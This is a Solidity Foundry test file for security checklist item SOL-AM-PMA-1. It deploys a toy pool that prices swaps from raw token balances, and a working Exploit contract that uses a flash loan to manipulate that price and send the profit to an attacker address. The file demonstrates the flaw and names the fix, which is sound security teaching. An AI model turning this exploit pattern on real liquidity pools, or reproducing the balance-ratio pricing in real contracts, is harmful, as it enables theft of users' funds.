// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * Overview:
 * Checklist Item ID: SOL-AM-PMA-1
 * Description: Price can be manipulated via flash loans or donations if it is derived from the ratio of token balances.
 * Remediation: Use the Chainlink oracles for the asset prices.
 *
 * This test demonstrates a flashloan price manipulation attack on a simple DEX.
 * The attack exploits the DEX's price calculation mechanism by:
 * 1. Taking a large flashloan of tokenA
 * 2. Temporarily manipulating the pool's reserves ratio
 * 3. Swapping tokens at the artificially favorable price
 * 4. Repaying the flashloan
 * 5. Keeping the profit from the price difference
 *
 * The vulnerability occurs because the pool calculates prices based purely on
 * its current reserves without any protection against manipulation.
 */


interface IFlashLoanReceiver {
    function receiveFlashLoan(IERC20 token, uint256 amount) external;
}

contract FlashLoanProvider {
    function flashLoan(address receiver, IERC20 token, uint256 amount) internal {
        uint256 balBefore = token.balanceOf(address(this));

        require(token.transfer(receiver, amount), "transfer failed");

        IFlashLoanReceiver(receiver).receiveFlashLoan(token, amount);

        require(token.balanceOf(address(this)) >= balBefore, "flashloan not repaid");
    }
}

contract AUSD is ERC20 {
    constructor() ERC20("A USD", "aUSD") {
        // Initialize aUSD token
    }
}

contract BUSD is ERC20 {
    constructor() ERC20("B USD", "bUSD") {
        // Initialize bUSD token
    }
}

contract Pool is FlashLoanProvider {
    IERC20 public immutable tokenA;
    IERC20 public immutable tokenB;

    constructor(IERC20 _tokenA, IERC20 _tokenB) {
        tokenA = _tokenA;
        tokenB = _tokenB;
    }

    function swap(IERC20 tokenIn, uint256 amountIn) external returns (uint256 amountOut) {
        require(tokenIn == tokenA || tokenIn == tokenB, "invalid token");
        IERC20 tokenOut = tokenIn == tokenA ? tokenB : tokenA;

        // Transfer tokens in
        require(tokenIn.transferFrom(msg.sender, address(this), amountIn), "transfer in failed");

        // Calculate amount out based on price
        uint256 price = getPrice(tokenIn, tokenOut);
        amountOut = amountIn * price / 1e18;

        // Transfer tokens out
        require(tokenOut.transfer(msg.sender, amountOut), "transfer out failed");

        return amountOut;
    }

    function getPrice(IERC20 tokenIn, IERC20 tokenOut) public view returns (uint256) {
        uint256 balIn = tokenIn.balanceOf(address(this));
        uint256 balOut = tokenOut.balanceOf(address(this));

        if (balIn == 0 || balOut == 0) {
            return 1e18; // 1:1 initial price
        }

        // Price is the ratio of output token to input token
        return balOut * 1e18 / balIn;
    }

    function flashLoanExternal(address receiver, IERC20 token, uint256 amount) external {
        require(token == tokenA || token == tokenB, "invalid token");
        flashLoan(receiver, token, amount);
    }
}

contract Exploit is IFlashLoanReceiver {
    Pool public pool;
    IERC20 public tokenA;
    IERC20 public tokenB;
    address public attacker;

    constructor(
        Pool _pool,
        IERC20 _tokenA,
        IERC20 _tokenB,
        address _attacker
    ) {
        pool = _pool;
        tokenA = _tokenA;
        tokenB = _tokenB;
        attacker = _attacker;
    }

    function attack(uint256 loanAmount) external {
        // Get the flashloan of tokenA
        pool.flashLoanExternal(address(this), tokenA, loanAmount);
    }

    function receiveFlashLoan(IERC20 token, uint256 loanAmount) external override {
        require(token == tokenA, "Expected tokenA flash loan");

        // Step 1: Now the pool has less tokenA, so the price of tokenA (in terms of tokenB) is higher

        // Step 2: Swap tokenA for tokenB at this manipulated rate
        uint256 swapAmount = 100 * 1e18;
        tokenA.transferFrom(attacker, address(this), swapAmount);
        tokenA.approve(address(pool), swapAmount);
        uint256 receivedB = pool.swap(tokenA, swapAmount);

        // Step 3: Repay the flash loan
        tokenA.transfer(address(pool), loanAmount);

        // Step 4: Send profits to attacker
        uint256 remainingBalanceA = tokenA.balanceOf(address(this));
        uint256 remainingBalanceB = tokenB.balanceOf(address(this));

        if (remainingBalanceA > 0) {
            tokenA.transfer(attacker, remainingBalanceA);
        }

        if (remainingBalanceB > 0) {
            tokenB.transfer(attacker, remainingBalanceB);
        }
    }
}

contract PoolTest is Test {
    AUSD tokenA;
    BUSD tokenB;
    Pool pool;
    Exploit exploit;
    address attacker = address(0xBEEF);

    function setUp() public {
        tokenA = new AUSD();
        tokenB = new BUSD();
        pool = new Pool(tokenA, tokenB);
        exploit = new Exploit(pool, tokenA, tokenB, attacker);

        // Set up initial pool with 1000 of each token (1:1 ratio)
        deal(address(tokenA), address(pool), 1000 * 1e18);
        deal(address(tokenB), address(pool), 1000 * 1e18);

        // Give attacker some initial tokens for potential swapping
        deal(address(tokenA), attacker, 100 * 1e18);
    }

    function testFlashloanPriceManipulation() public {
        uint256 attackerInitBalanceA = tokenA.balanceOf(attacker);
        uint256 attackerInitBalanceB = tokenB.balanceOf(attacker);

        // Set up the parameters for the attack - borrow 500 tokenA as flashloan, swap 100 tokenA for tokenB
        uint256 swapAmount = 100 * 1e18;
        uint256 loanAmount = 500 * 1e18;

        // Attacker performs exploit
        vm.prank(attacker);
        tokenA.approve(address(exploit), swapAmount);

        // Perform the attack
        exploit.attack(loanAmount);

        // Check final state
        uint256 attackerFinalBalanceA = tokenA.balanceOf(attacker);
        uint256 attackerFinalBalanceB = tokenB.balanceOf(attacker);

        // Assert a profit in at least one of the tokens
        assertGt(
            attackerFinalBalanceA + attackerFinalBalanceB,
            attackerInitBalanceA + attackerInitBalanceB,
            "Should have made a profit"
        );
    }
}
